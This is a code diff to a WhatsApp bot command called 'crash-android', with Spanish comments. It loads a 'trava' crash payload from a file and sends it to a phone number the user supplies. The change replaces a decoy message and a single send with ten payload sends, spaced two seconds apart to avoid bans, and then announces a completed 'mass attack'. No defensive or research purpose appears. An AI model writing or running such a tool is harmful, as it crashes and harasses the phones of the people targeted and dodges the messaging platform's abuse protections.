@@ -3,7 +3,7 @@ import path from 'path';
 
 const crashAndroidMisa = {
     name: 'crash-android',
-    alias: ['ca', 'crash', 'ola'],
+    alias: ['ca', 'crash', 'ola', 'multi-crash'],
     category: 'tools',
     noPrefix: true,
     isOwner: false,
@@ -13,7 +13,7 @@ const crashAndroidMisa = {
             const chat = m.key.remoteJid;
 
             if (!args[0]) {
-                const textoUso = `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]\n> ✐ *Ejemplo:* ${command} 1809xxxxxxx`;
+                const textoUso = `✧ ‧₊˚ *MISA CRASH x10* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]`;
                 return await conn.sendMessage(chat, { text: textoUso }, { quoted: m });
             }
 
@@ -30,32 +30,35 @@ const crashAndroidMisa = {
 
             const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');
 
-            // 1. Reacción de espera
-            await conn.sendMessage(chat, { react: { text: '⏳', key: m.key } });
+            // 1. Reacción de inicio de ataque
+            await conn.sendMessage(chat, { react: { text: '🚀', key: m.key } });
 
-            // 2. PRIMER ENVÍO: Mensaje "señuelo" para abrir el canal
-            // Esto hace que WhatsApp crea que es una conversación normal
-            await conn.sendMessage(targetJid, { text: '...' });
-
-            // 3. SEGUNDO ENVÍO: La carga pesada con un pequeño retraso
-            setTimeout(async () => {
+            // 2. Bucle de envío (10 veces)
+            for (let i = 1; i <= 10; i++) {
                 try {
+                    // Enviamos la carga
                     await conn.sendMessage(targetJid, { text: contenidoTrava });
                     
-                    // Reacción final de éxito
-                    await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
+                    // Log en consola para que veas el progreso en SkyUltraPlus
+                    console.log(`[MISA-BOT] Carga ${i}/10 enviada a ${num}`);
+
+                    // Esperamos 2 segundos entre cada envío para evitar el baneo/bloqueo
+                    if (i < 10) await new Promise(resolve => setTimeout(resolve, 2000));
                     
-                    await conn.sendMessage(chat, { 
-                        text: `✅ *Ataque entregado con éxito a @${num}*`,
-                        mentions: [targetJid]
-                    }, { quoted: m });
                 } catch (e) {
-                    console.error('Fallo al enviar trava:', e);
+                    console.error(`Error en el envío ${i}:`, e);
                 }
-            }, 1500); // 1.5 segundos de espera entre mensajes
+            }
+
+            // 3. Confirmación final
+            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
+            await conn.sendMessage(chat, { 
+                text: `✅ *Ataque Masivo Finalizado*\n> Se enviaron 10 ráfagas de 'ola.js' a @${num}`,
+                mentions: [targetJid]
+            }, { quoted: m });
 
         } catch (err) {
-            console.error('Error en crash-android:', err);
+            console.error('Error en crash-android masivo:', err);
         }
     }
 };
